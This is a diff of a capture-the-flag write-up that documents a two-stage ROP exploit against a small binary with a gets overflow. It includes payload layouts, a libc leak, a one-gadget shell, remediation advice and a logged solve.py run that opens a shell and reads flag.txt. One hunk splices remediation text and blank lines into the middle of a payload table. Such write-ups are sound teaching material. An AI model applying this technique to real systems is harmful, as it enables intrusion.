@@ -93,10 +93,11 @@ constructed payloads cannot include a newline character (`0x0a`). Since the
 second payload is partially random, occassionally it will include `0x0a` and
 the exploit must be run again. 
 
-**Exploit description:**
-- `solve.py` interacts with the target using pwntools, and performs the exploit
-int two stages: The first stage leaks the libc base address, while the second
-stage uses the leaked address to construct a payload that launches `/bin/sh`.
+### Detail Exploit Description
+The `solve.py` script interacts with the target using pwntools, and performs the
+exploit int two stages: The first stage leaks the libc base address, while the
+second stage uses the leaked address to construct a payload that launches
+`/bin/sh`.
 
 The two-stage design is required because the `chall` binary is small, and does
 not have enough ROP gagdets to easily construct a shell execution or file read
@@ -248,7 +249,7 @@ Just before this call, the second stack is fully rolled up and `rsp` is 16-byte
 aligned. When the call is made, it launches a `/bin/sh` shell and `solve.py`
 enters interactive mode, allowing the attacker to display the contents of `flag.txt`. 
 
-#### Payload Structures
+### Payload Structures
 **Payload 1**
 ```
 ---------------------------------------------------------
@@ -275,6 +276,31 @@ enters interactive mode, allowing the attacker to display the contents of `flag.
 | rdi value                     | NULL (0x0)    | 8 bytes   | 
 | execv "one gadget" address    | libc+0xd511f  | 8 bytes   |
 -------------------------------------------------------------
+```
+
+## Remediation
+- replace gets with fgets
+- mitigations:
+    - stack canary 
+    - PIE disabled 
+
+## Configuration Notes
+- Use container 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 -----------------------------------------------------
 | Component                             | Size      |
@@ -430,13 +456,74 @@ Structure:
 ```
 
 ## Remediation
-- replace gets with fgets
-- mitigations:
-    - stack canary 
-    - PIE disabled 
+
+To patch the vulnerability, `chall.c` should use an alternative to `gets`, which
+is almost always insecure. Using a drop-in replacement like `fgets` with a
+correct buffer size argument (i.e. `sizeof(world_name) - 1`) would prevent the
+buffer overflow entirely. 
+
+Besides this, adding exploit mitigations would make the ROP chain more difficult
+to construct (but likely not impossible):
+* Stack canaries would prevent the chain from returning into the first gadget without
+find another leak primitive to leak the canary value 
+* PIE would prevent hardcoding instructions from the code itself into the ROP chain
+without another leak primitive
+
 
 ## Configuration Notes
-- Use container 
+
+Use container for development:
+
+```bash
+docker build -t lactf-minecraft -f Dockerfile
+docker run --rm -it -v $(pwd):/ctf lactf-minecraft /bin/tmux
+```
+
+Execute solution script against local target in container:
+
+```bash
+$ python3 solve.py
+[+] Starting local process '/ctf/chall/ld-linux-x86-64.so.2': pid 16
+Press enter to start exploit
+Building payload 1...
+Payload 1 bytes:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00N@\x00\x00\x00\x00\x00\xef\x10@\x00\x00\x00\x00\x00v\x11@\x00\x00\x00\x00\x00C\x12@\x00\x00\x00\x00\x00'
+Payload 1 length:  96
+Sending first payload...
+Navigating to return...
+Ret into the payload...
+Sending GOT address to leak puts...
+Leaked puts address (in libc):  0x7b2386677980
+Building payload 2...
+Libc base:  0x7b2386600000
+pop_rbp_r13_addr:  0x7b23866fea7c
+pop_rdi_addr:  0x7b23866277e5
+one_gadget_addr:  0x7b23866d511f
+Payload 2 bytes:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\x00\x00\x00\x00|\xeao\x86#{\x00\x00\x00O@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe5wb\x86#{\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1fQm\x86#{\x00\x00'
+Payload 2 length:  120
+Sending second payload...
+Opening shell...
+[*] Switching to interactive mode
+
+$ cat chall/flag.txt
+THIS_IS_THE_FLAGTHIS_IS_THE_FLAGTHIS_IS_THE_FLAGTHIS_IS_THE_FLAG
+$  
+```
+
+Execute solution script and start GDB for debugging target locally in
+container, writing `pwntools` debugging context to stdout:
+
+```
+$ python3 solve.py GDB LOG
+```
+
+Execute solution script against remote target (assuming instance running
+remotely and `solve.py` includes correct domain/port):
+
+```
+python3 solve.py REMOTE
+<snip>
+$ cat flag.txt
+```
 
 # ropfu
 
